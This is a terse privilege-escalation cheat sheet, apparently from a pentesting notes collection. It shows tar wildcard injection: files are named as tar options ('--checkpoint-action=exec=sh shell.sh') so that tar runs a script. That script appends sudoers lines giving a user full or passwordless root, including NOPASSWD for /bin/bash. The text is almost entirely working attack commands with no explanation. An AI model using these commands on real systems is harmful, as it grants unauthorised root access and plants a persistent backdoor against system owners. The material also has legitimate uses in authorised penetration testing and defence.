Writable /etc/sudoers
# tar cf
echo "" >> --checkpoint=1
echo "" > "--checkpoint-action=exec=sh shell.sh"
# use all
echo 'echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers' > shell.sh
# use SUDO without password
echo 'echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers' > shell.sh
echo 'echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers' > shell.sh

